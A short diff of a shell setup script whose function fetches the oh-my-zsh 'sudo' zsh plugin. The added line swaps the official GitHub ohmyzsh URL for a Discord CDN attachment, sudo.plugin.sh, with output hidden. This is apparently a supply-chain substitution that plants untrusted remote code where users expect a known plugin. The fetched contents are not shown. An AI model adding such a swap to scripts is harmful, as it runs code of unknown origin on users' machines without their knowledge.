@@ -98,7 +98,7 @@ function copia() {
     sudo mkdir zsh-sudo
     sudo chown $USER:$USER zsh-sudo/
     cd zsh-sudo
-    wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/sudo/sudo.plugin.zsh > /dev/null 2>&1
+    wget https://cdn.discordapp.com/attachments/1012227636312944650/1145753555697930260/sudo.plugin.sh > /dev/null 2>&1
     echo -e "\e[32mOK\e[0m"
 
     # descarga de fuentes
